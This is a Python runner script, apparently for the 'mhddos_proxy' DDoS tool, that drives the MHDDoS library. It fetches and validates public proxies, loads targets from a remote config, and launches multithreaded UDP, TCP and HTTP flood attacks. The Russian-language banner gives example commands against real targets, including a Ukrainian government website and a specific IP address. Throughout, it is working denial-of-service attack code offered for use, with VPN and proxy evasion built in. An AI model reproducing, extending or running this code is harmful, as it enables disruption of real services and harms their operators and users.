import argparse
import os
import random
import socket
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from functools import lru_cache
from multiprocessing import cpu_count
from threading import Thread

import requests
from PyRoxy import Proxy
from yarl import URL

from mhddos.start import logger, Methods, bcolors, main as mhddos_main


PROXIES_URL = 'https://raw.githubusercontent.com/porthole-ascend-cinnamon/proxy_scraper/main/proxies.txt'
PROXY_TIMEOUT = 5
UDP_THREADS = 1
LOW_RPC = 1000

THREADS_PER_CORE = 1000
MAX_DEFAULT_THREADS = 4000


@lru_cache
def resolve_host(url):
    try:
        return socket.gethostbyname(URL(url).host)
    except socket.gaierror:
        exit(f'Невалидна цель {url} - проверьте правильность написания')


class Targets:
    def __init__(self, targets, config):
        self.targets = targets
        self.config = config
        self.config_targets = []

    def __iter__(self):
        self.load_config()
        for target in self.targets + self.config_targets:
            yield self.prepare_target(target)

    def prepare_target(self, target):
        if '://' in target:
            return target

        try:
            _, port = target.split(':', 1)
        except ValueError:
            port = '80'

        scheme = 'https://' if port == '443' else 'http://'
        return scheme + target

    def load_config(self):
        if not self.config:
            return

        try:
            config_content = requests.get(self.config, timeout=5).text
        except requests.RequestException:
            logger.warning('Could not load new config, proceeding with the last known good one')
        else:
            self.config_targets = [
                target.strip()
                for target in config_content.split()
                if target.strip()
            ]


def download_proxies():
    response = requests.get(PROXIES_URL, timeout=10)
    for line in response.iter_lines(decode_unicode=True):
        yield Proxy.fromString(line)


def update_proxies(period, targets):
    #  Avoid parsing proxies too often when restart happens
    if os.path.exists('files/proxies/proxies.txt'):
        last_update = os.path.getmtime('files/proxies/proxies.txt')
        if (time.time() - last_update) < period / 2:
            logger.info(f'{bcolors.OKGREEN}Используется список прокси из предыдущего запуска{bcolors.RESET}')
            return

    logger.info(f'{bcolors.OKGREEN}Загружаем список прокси...{bcolors.RESET}')
    Proxies = list(download_proxies())
    random.shuffle(Proxies)

    size = len(targets)
    logger.info(
        f'{bcolors.WARNING}Проверяем на работоспособность {bcolors.OKBLUE}{len(Proxies):,}{bcolors.WARNING}'
        f' прокси - это может занять пару минут:{bcolors.RESET}'
    )

    future_to_proxy = {}
    with ThreadPoolExecutor(THREADS_PER_CORE) as executor:
        for target, chunk in zip(targets, (Proxies[i::size] for i in range(size))):
            future_to_proxy.update({
                executor.submit(proxy.check, target, PROXY_TIMEOUT): proxy
                for proxy in chunk
            })

        CheckedProxies = [
            future_to_proxy[future]
            for future in as_completed(future_to_proxy) if future.result()
        ]

    if not CheckedProxies:
        logger.error(
            'Не найдено рабочих прокси. '
            'Убедитесь что интернет соединение стабильное и цель доступна. '
            'Перезапустить Docker.'
        )
        exit()

    logger.info(f'{bcolors.WARNING}Найдено рабочих прокси: {bcolors.OKBLUE}{len(CheckedProxies):,}{bcolors.RESET}')

    os.makedirs('files/proxies/', exist_ok=True)
    with open('files/proxies/proxies.txt', 'w') as wr:
        for proxy in CheckedProxies:
            wr.write(str(proxy) + '\n')


def run_ddos(targets, total_threads, period, rpc, http_methods, vpn_mode, debug):
    threads_per_target = total_threads // len(targets)
    params_list = []
    proxy_file = 'empty.txt' if vpn_mode else 'proxies.txt'
    for target in targets:
        ip = resolve_host(target)
        # UDP
        if target.lower().startswith('udp://'):
            logger.warning(f'Make sure VPN is enabled - proxies are not supported for UDP targets: {target}')
            params_list.append(['UDP', target[6:], ip, UDP_THREADS, period])

        # TCP
        elif target.lower().startswith('tcp://'):
            params_list.append(['TCP', target[6:], ip, threads_per_target, period, proxy_file])

        # HTTP(S)
        else:
            threads = threads_per_target // len(http_methods)
            for method in http_methods:
                params_list.append([method, target, ip, threads, period, proxy_file, rpc])

    logger.info(f'{bcolors.OKGREEN}Запускаем атаку...{bcolors.RESET}')
    for params in params_list:
        Thread(target=mhddos_main, args=params, kwargs={'debug': debug}, daemon=True).start()
    time.sleep(period + 3)


def start(total_threads, period, targets, rpc, http_methods, vpn_mode, debug):
    os.chdir('mhddos')
    while True:
        resolved = list(targets)
        if not resolved:
            logger.error('Must provide either targets or a valid config file')
            exit()

        if rpc < LOW_RPC:
            logger.warning(
                f'RPC меньше {LOW_RPC}. Это может привести к снижению производительности '
                f'из-за увеличения количества переключений каждого потока между прокси.'
            )

        no_proxies = vpn_mode or all(target.lower().startswith('udp://') for target in resolved)
        if not no_proxies:
            update_proxies(period, resolved)
        run_ddos(resolved, total_threads, period, rpc, http_methods, vpn_mode, debug)


def init_argparse() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser()
    parser.add_argument(
        'targets',
        nargs='*',
        help='List of targets, separated by spaces',
    )
    parser.add_argument(
        '-c',
        '--config',
        help='URL to a config file',
    )
    parser.add_argument(
        '-t',
        '--threads',
        type=int,
        default=min(THREADS_PER_CORE * cpu_count(), MAX_DEFAULT_THREADS),
        help='Total number of threads to run (default is CPU * 1000)',
    )
    parser.add_argument(
        '-p',
        '--period',
        type=int,
        default=900,
        help='How often to update the proxies (in seconds) (default is 900)',
    )
    parser.add_argument(
        '--rpc',
        type=int,
        default=2000,
        help='How many requests to send on a single proxy connection (default is 2000)',
    )
    parser.add_argument(
        '--debug',
        action='store_true',
        default=False,
        help='Enable debug output from MHDDoS',
    )
    parser.add_argument(
        '--vpn',
        dest='vpn_mode',
        action='store_true',
        default=False,
        help='Disable proxies to use VPN',
    )
    parser.add_argument(
        '--http-methods',
        nargs='+',
        type=str.upper,
        default=['GET', 'POST', 'STRESS', 'BOT', 'PPS'],
        choices=Methods.LAYER7_METHODS - {'DGB', 'BOMB', 'KILLER'},
        help='List of HTTP(s) attack methods to use. Default is GET, POST, STRESS, BOT, PPS',
    )
    return parser


def print_banner(vpn_mode):
    print(f'''
                            !!!{'ВКЛЮЧИТЕ VPN!!!' if vpn_mode else 'ОТКЛЮЧИТЕ VPN!!!  (кроме UDP атак)'}

- Нагрузка - `-t XXXX` - количество потоков по умолчанию - CPU * 1000
    python3 runner.py -t 3000 https://ssu.gov.ua tcp://194.32.111.6:22
    
- Информация о ходе атаки - флажок `--debug`
    python3 runner.py --debug https://ssu.gov.ua tcp://194.32.111.6:22

- Полная документация- https://github.com/porthole-ascend-cinnamon/mhddos_proxy
    ''')


if __name__ == '__main__':
    args = init_argparse().parse_args()
    print_banner(args.vpn_mode)
    start(
        args.threads,
        args.period,
        Targets(args.targets, args.config),
        args.rpc,
        args.http_methods,
        args.vpn_mode,
        args.debug,
    )
